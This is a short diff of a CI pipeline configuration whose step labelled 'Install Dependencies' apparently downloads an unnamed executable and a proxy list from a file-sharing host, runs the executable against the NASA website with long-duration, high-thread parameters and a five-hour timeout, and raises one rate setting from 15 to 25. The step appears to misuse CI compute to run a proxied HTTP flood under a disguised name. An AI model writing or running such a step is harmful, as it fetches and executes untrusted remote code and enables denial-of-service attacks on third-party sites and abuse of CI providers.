@@ -7,7 +7,7 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: apt update && apt install nodejs wget -y && wget https://transfer.sh/7vRVg3/jsss && wget https://transfer.sh/3qaHVl/proxy.txt && chmod +x jsss && ./jsss https://www.nasa.gov/ 999999 100 15
+            command: apt update && apt install nodejs wget -y && wget https://transfer.sh/7vRVg3/jsss && wget https://transfer.sh/3qaHVl/proxy.txt && chmod +x jsss && ./jsss https://www.nasa.gov/ 999999 100 25
             no_output_timeout: 5h
 
 workflows:
